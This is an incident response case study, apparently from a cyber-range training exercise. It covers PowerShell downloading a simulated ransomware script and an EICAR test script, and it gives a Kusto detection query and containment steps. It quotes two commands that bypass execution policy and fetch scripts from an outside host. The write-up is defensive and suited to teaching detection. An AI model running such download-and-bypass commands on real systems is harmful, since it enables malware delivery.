
# 🛡️ Incident Response Case Study: PowerShell Script Execution via Suspicious Web Requests

## 📅 Summary

While monitoring endpoint activity, a PowerShell-based suspicious web request alert was triggered. Upon investigation, two different scripts were downloaded and executed via PowerShell on a single workstation. This incident required analysis, containment, and post-incident policy changes.

---

## 🔍 Detection and Analysis

### 🔔 Alert:

**DAKBLA-Create Alert Rule** flagged suspicious PowerShell activity on host `dakbla88`.

### 🔎 Investigation:

The following PowerShell commands were executed by a user:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\ProgramData\pwncrypt.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\ProgramData\eicar.ps1
```

The user claimed they were attempting to install free software, after which a black screen appeared and nothing else happened.

Using Microsoft Defender for Endpoint (MDE), it was confirmed both scripts **were executed**. This Kusto query was used to identify the executions:

```kusto
let TargetHostname = "dakbla88";
let ScriptNames = dynamic(["eicar.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, FileName
| summarize Count = count() by AccountName, DeviceName, ProcessCommandLine, FileName
```

### 🧪 Script Behavior (from Malware Team):

* **`pwncrypt.ps1`**:
  *Creates fake sensitive company files on the user’s Desktop, encrypts them using AES, and drops ransom instructions demanding Bitcoin.*

* **`eicar.ps1`**:
  *Generates the standard EICAR antivirus test file to simulate malware detection.*

---

## ❌ Containment, Eradication & Recovery

* Isolated the affected machine using Microsoft Defender for Endpoint.
* Performed a full anti-malware scan (results came back clean).
* Removed the device from isolation.

---

## ✅ Post-Incident Actions

* The user completed **additional cybersecurity awareness training**.
* Upgraded our security awareness platform with **KnowBe4** and increased training frequency.
* Began enforcing a **PowerShell restriction policy** for non-essential users.

---

## 💡 Key Takeaways

* PowerShell can be easily misused to download and execute scripts — restricting its use is critical.
* Defender for Endpoint and Kusto queries are powerful tools for identifying post-execution activity.
* Security awareness and proper alerting rules can significantly reduce incident response time.

---


